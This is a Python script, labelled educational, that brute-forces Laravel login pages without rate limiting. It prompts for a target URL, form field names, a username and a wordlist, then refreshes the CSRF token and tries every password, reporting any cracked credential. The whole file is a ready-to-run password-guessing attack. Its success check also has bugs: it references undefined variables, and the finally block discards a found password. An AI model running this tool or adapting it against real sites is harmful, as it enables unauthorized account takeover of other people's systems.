# ============================================
# Script Created By: Ralph Rallion Laynes
# Codename: Pakner
# This script is designed for educational purposes only.
# Script Purpose: Brute Force Login Attack Script in Laraveel
# Description: This script was designed and developed to brute force laravel authentication that don't have a throttle or security mechanisms in place.
# It dynamically handles form fields (username, password) and attempts login using a wordlist.
# Date: May 7, 2025
# Version: 1.0
# ============================================

import requests
from bs4 import BeautifulSoup
import time
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Get Params from user
def get_user_input():
    url = input("Enter the target website URL (e.g., http://192.168.70.9:8000): ")
    correct_location = input("Enter the correct location after successful login (e.g., /dashboard): ")
    username_field = input("Enter the name of the username field (e.g., email, username): ")
    password_field = input("Enter the name of the password field (e.g., password): ")
    username = input("Enter the username or email for login (e.g., gwapoako@gmail.com): ")
    wordlist_path = input("Enter the path to your wordlist file (e.g., /usr/share/wordlists/rockyou.txt): ")
    
    return url, correct_location, username_field, password_field, username, wordlist_path

def init_session():
    session = requests.Session()
    retry_strategy = Retry(
        total=5,
        backoff_factor=1,
        status_forcelist=[408, 429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

# Head
def get_csrf_token(session, url, request_timeout, max_retries_per_password, delay_between_attempts):
    """Fetch CSRF token from the website"""
    for attempt in range(1, max_retries_per_password + 1):
        try:
            response = session.get(url, timeout=request_timeout)
            if not response.headers.get('Content-Type', '').startswith('text/html'):
                raise ValueError("Invalid content type received")
                
            soup = BeautifulSoup(response.text, "html.parser")
            csrf_token = None
            for selector in ['input[name="_token"]', 'meta[name="csrf-token"]']:
                element = soup.select_one(selector)
                if element and element.get('value' if 'input' in selector else 'content'):
                    csrf_token = element.get('value' if 'input' in selector else 'content')
                    break
            
            if csrf_token:
                print(f"[Attempt {attempt}] CSRF Token: {csrf_token[:12]}...")
                return csrf_token
                
            print(f"[Attempt {attempt}] CSRF token not found in response")
        except Exception as e:
            print(f"[Attempt {attempt}] Token fetch error: {str(e)[:50]}...")
        
        if attempt < max_retries_per_password:
            time.sleep(delay_between_attempts * attempt)
    
    print("Failed to get CSRF token after multiple attempts")
    return None

# Verifying successful login
def verify_success(response, correct_location, username, request_timeout):
    """Comprehensive success verification"""
    if response.status_code == 302:
        location = response.headers.get('Location', '')
        if correct_location in location:
            return True
    
    try:
        redirect_url = response.headers.get('Location')
        if redirect_url:
            if not redirect_url.startswith('http'):
                redirect_url = f"http://{url}{redirect_url}"
            redirect_response = session.get(redirect_url, timeout=request_timeout)
            
            logged_in_indicators = [
                'logout', 'dashboard', 'welcome', username.split('@')[0],
                'sign out', 'log out', 'my account'
            ]
            
            content = redirect_response.text.lower()
            if any(indicator in content for indicator in logged_in_indicators):
                return True
    except:
        pass
    
    if 'laravel_session' in response.cookies:
        return True
        
    return False

# Attempt to login with each password
def attempt_login(session, url, password, csrf_token, username, request_timeout, correct_location, username_field, password_field):
    """Attempt login with the given password and CSRF token"""
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "X-XSRF-TOKEN": csrf_token,
        "Referer": url
    }
    
    payload = {
        "_token": csrf_token,
        username_field: username,
        password_field: password,
        "submitbtn": "Submit"
    }
    
    try:
        response = session.post(url, data=payload, headers=headers, allow_redirects=False, timeout=request_timeout)
        
        print(f"↳ [{response.status_code}] Trying: {password.ljust(15)} | Location: {response.headers.get('Location', 'N/A')}")
        
        if verify_success(response, correct_location, username, request_timeout):
            return True
            
        if response.status_code == 419:
            print("CSRF token expired - will refresh")
            return 'refresh'
            
        return False
    except Exception as e:
        print(f"⚠️ Network error: {str(e)[:50]}...")
        return False

# Brute
def run_attack(url, correct_location, username_field, password_field, username, wordlist_path, request_timeout=30, max_retries_per_password=1, delay_between_attempts=1):
    """Main brute-force attack function"""
    session = init_session()
    
    try:
        with open(wordlist_path, 'r', encoding='latin-1') as f:
            for line in f:
                password = line.strip()
                if not password:
                    continue
                
                print(f"\n• Trying password: {password}")
                
                for attempt in range(1, max_retries_per_password + 1):
                    csrf_token = get_csrf_token(session, url, request_timeout, max_retries_per_password, delay_between_attempts)
                    if not csrf_token:
                        continue
                        
                    result = attempt_login(session, url, password, csrf_token, username, request_timeout, correct_location, username_field, password_field)
                    
                    if result is True:
                        print(f"\n BOOM PANIS CRACKED! Password found: {password}")
                        return password
                    elif result == 'refresh':
                        break
                    
                    if attempt < max_retries_per_password:
                        time.sleep(delay_between_attempts)
                        
    except KeyboardInterrupt:
        print("\n Script interrupted by user")
    except Exception as e:
        print(f"\n Critical error: {e}")
    finally:
        print("\nAttack completed")
        return None

if __name__ == "__main__":
    url, correct_location, username_field, password_field, username, wordlist_path = get_user_input()
    print(f"\n Matutong maghintay!!!!!...\n")
    found_password = run_attack(url, correct_location, username_field, password_field, username, wordlist_path)
    if found_password:
        print(f"\n Pota Success Pare! Valid password is: {found_password}")
    else:
        print("\n Sorry pare! walang nahanap")
